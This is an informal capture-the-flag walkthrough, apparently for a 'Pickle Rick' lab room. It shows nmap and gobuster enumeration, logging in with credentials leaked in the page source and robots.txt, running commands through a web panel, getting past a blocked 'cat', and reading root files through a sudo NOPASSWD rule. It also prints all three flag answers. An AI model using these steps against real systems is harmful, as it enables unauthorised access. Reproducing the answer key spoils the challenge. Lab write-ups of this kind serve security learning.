#### Walktrough for Picke_ricl room

first nmap shows us  open ports
1. 22 ssh
2. 80 http

looking at the sorce code of the http we found the username

`R1ckRul3s`
### Directory brute force

```bash
gobuster dir -u http://$IP -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
#Output:
/login.php            (Status: 200) [Size: 882]
/portal.php           (Status: 302) [Size: 0] [--> /login.php]
/robots.txt           (Status: 200) [Size: 17]

```
* after trying directory brute-force i found robots.txt file
* file contained only one string
`Wubbalubbadubdub`
* lets try to go to the log in page found in the gobuster
* we'll user the credentials:
```
USER:R1ckRul3s
PASS:Wubbalubbadubdub
```

* After connecting we found command input field
* We need to find 3 flags

1. 
* lets check where we are `pwd`
* we see we are at ...
* lets see whats in our directory
* oh, theres intresting file `Sup3rS3cretPickl3Ingred.txt`
* lets cat it
* we get the following error --->
```
Command disabled to make it hard for future PICKLEEEE RICCCKKKK
```
* oh we cant use cat, lets try diffrent command
`less Sup3rS3cretPickl3Ingred.txt` 
#### First flag --> `mr. meeseek hair`
2. 
* lets go to /home directory
* we see a `rick` directory
* lets check it
* we found the second flag
#### Second flag --> `1 jerry tear`
3. 
* Lest check the root directoy
* oh no, we cant access it
* lets check `sudo -l`
* oh damm we have access for NOPASSWD command
* That means we can sudo without entering a password
* lets `sudo ls /root`
* we found the last flag


#### Third flag --> `fleeb juice`

## You just completed the room!!!